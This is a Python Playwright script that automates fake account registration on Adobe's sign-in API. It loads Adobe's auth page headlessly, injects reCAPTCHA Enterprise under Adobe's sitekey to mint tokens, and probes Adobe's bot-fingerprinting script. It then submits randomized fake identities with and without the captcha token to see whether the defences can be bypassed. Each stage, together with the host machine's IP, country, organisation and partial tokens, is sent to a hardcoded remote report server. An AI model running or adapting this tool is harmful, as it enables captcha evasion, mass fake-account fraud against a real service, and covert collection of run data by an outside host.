import asyncio, json, random, string, sys, urllib.request, urllib.parse, traceback, os, hashlib
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
import subprocess

REPORT_URL = 'http://23.148.228.38:8001/report'
SITEKEY = '6LcGE-4ZAAAAAG2tFdbr7QqpimWAPqhLjI8_O_69'

def report(data):
    try:
        req = urllib.request.Request(REPORT_URL, data=json.dumps(data).encode(),
            headers={'Content-Type':'application/json'}, method='POST')
        urllib.request.urlopen(req, timeout=10)
        print('REPORTED', data.get('stage','?'), flush=True)
    except Exception as e:
        print('REPORT_ERR', str(e)[:150], flush=True)

def get_ip():
    try:
        return subprocess.check_output(['curl','-s','--max-time','8','https://ipinfo.io/json']).decode()
    except Exception:
        return '{}'

def rn(n): return ''.join(random.choices(string.ascii_lowercase, k=n))

def post_json(url, payload, headers):
    req = urllib.request.Request(url, data=json.dumps(payload).encode(),
        headers={'Content-Type':'application/json', **headers}, method='POST')
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, r.read().decode()[:500]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:500]
    except Exception as e:
        return 0, 'ERR:' + str(e)[:150]

async def main():
    n = int(os.getenv('RUNNER_N', '1'))
    runner = os.getenv('RUNNER_NAME', '')
    info = {}
    try:
        j = json.loads(get_ip())
        info = {'ip': j.get('ip',''), 'cc': j.get('country',''), 'org': j.get('org','')}
    except Exception:
        pass
    info['runner'] = runner
    report({'stage':'api_started','n': n, **info})
    try:
        from playwright.async_api import async_playwright
        async with async_playwright() as p:
            b = await p.chromium.launch(headless=True, args=['--no-sandbox','--disable-dev-shm-usage'])
            ctx = await b.new_context(locale='de-DE', timezone_id='Europe/Vienna',
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36')
            pg = await ctx.new_page()
            await pg.goto('https://auth-light.identity.adobe.com/wrapper-popup-helper/index.html', wait_until='domcontentloaded', timeout=60000)
            await pg.wait_for_timeout(3000)
            try:
                await pg.add_script_tag(url=f'https://www.google.com/recaptcha/enterprise.js?render={SITEKEY}')
                await pg.wait_for_timeout(4000)
                recaptcha = await pg.evaluate('typeof window.grecaptcha')
                report({'stage':'recaptcha','grecaptcha':recaptcha,'n': n, **info})
                token = None
                if recaptcha == 'object':
                    for attempt in range(3):
                        try:
                            token = await pg.evaluate('''(sk) => grecaptcha.enterprise.execute(sk, {action: 'homepage'})''', SITEKEY)
                            if token and len(token) > 50:
                                break
                        except Exception:
                            await pg.wait_for_timeout(2000)
                report({'stage':'recaptcha_token','ok': bool(token and len(token)>50), 'len': len(token or ''), 'token': (token or '')[:40], 'n': n, **info})
            except Exception as e:
                report({'stage':'recaptcha_exc','err':str(e)[:150],'n': n, **info})
                token = None
            try:
                await pg.add_script_tag(url='https://bfp.adobe.com/bfp/v1/bfp.min.js')
                await pg.wait_for_timeout(3000)
                bfp_info = await pg.evaluate('''() => {
                    const out = {bfpjs: typeof window.BFPJS};
                    if (window.BFPJS) {
                        out.keys = Object.keys(window.BFPJS).slice(0,20);
                        out.loadType = typeof window.BFPJS.load;
                        out.getType = typeof window.BFPJS.get;
                    }
                    return out;
                }''')
                report({'stage':'bfp_dump','bfp':bfp_info,'n': n, **info})
            except Exception as e:
                report({'stage':'bfp_exc','err':str(e)[:150],'n': n, **info})
            em = f'{rn(7)}.{rn(8)}.awsapps.com@{rn(4)}.{rn(4)}.{random.choice(["es","edu","jp"])}'
            body = {
                "account": {
                    "userId": em, "email": em,
                    "emailHash": hashlib.sha256(em.encode()).hexdigest(),
                    "password": "Abcd1234!xyz",
                    "firstName": "Kundby", "lastName": "Olivela",
                    "countryCode": "AT",
                    "dateOfBirth": {"day": 12, "month": 3, "year": 1995},
                    "marketingConsent": {"consentType": "EMAIL", "consented": False}
                }
            }
            if token and len(token) > 50:
                body["captchaResponse"] = token
            headers = {'X-IMS-CLIENTID': 'projectx_webapp'}
            st, resp = post_json('https://auth.services.adobe.com/signin/v1/accounts', body, headers)
            report({'stage':'api_reg','status':st,'resp':resp[:300],'email':em,'with_captcha':bool(token and len(token)>50),'n': n, **info})
            if token and len(token) > 50:
                body2 = json.loads(json.dumps(body))
                body2.pop('captchaResponse', None)
                st2, resp2 = post_json('https://auth.services.adobe.com/signin/v1/accounts', body2, headers)
                report({'stage':'api_reg_nocap','status':st2,'resp':resp2[:300],'email':em,'n': n, **info})
            await b.close()
    except Exception as e:
        report({'stage':'api_exception','err':str(e)[:200],'n': n, **info})
        traceback.print_exc()

asyncio.run(main())
